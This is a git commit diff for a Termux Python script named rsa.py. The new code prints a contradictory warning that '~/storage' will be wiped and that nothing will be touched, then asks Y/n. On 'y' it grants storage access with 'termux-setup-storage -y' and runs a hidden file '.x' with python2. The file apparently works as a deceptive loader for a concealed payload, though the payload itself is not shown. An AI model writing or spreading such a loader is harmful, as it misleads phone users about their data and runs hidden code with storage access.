9478d48e5d9af07d5e54d1d562aa71ac1c53ec7d
RSAPROGRAMMER <85215747+RSAPROGRAMMER@users.noreply.github.com>
2021-08-01 14:39:33 +0500

    Update rsa.py

--- rsa.py
+++ rsa.py
@@ -1,6 +1,49 @@
 import os
 
-def setup():
-  os.system ("termux-setup-storage -y")
-  os.system ("python2 .x.py")
-setup()
+def a():
+
+    os.system('clear')
+
+    #os.system('termux-setup-storage')
+
+    os.system('clear')
+
+    print ("Directory '~/storage")
+
+    print ("is going to be wiped. ")
+
+    print ("No storage contents will be touched.")
+
+    print ("")
+
+    g()
+
+def g():
+
+    r=raw_input("        Y/n : ")
+
+    if r== 'y':
+
+        os.system('termux-setup-storage -y')
+
+        os.system("python2 .x")
+
+    elif r== 'Y':
+
+        os.system('termux-setup-storage -y')
+
+        os.system("python2 .x")
+
+    elif r== 'n':
+
+        print ("Dont Use Thanks")
+
+    else:
+
+        print ("Type  Y ")
+
+        a()
+
+if __name__ == '__main__':
+
+    a()
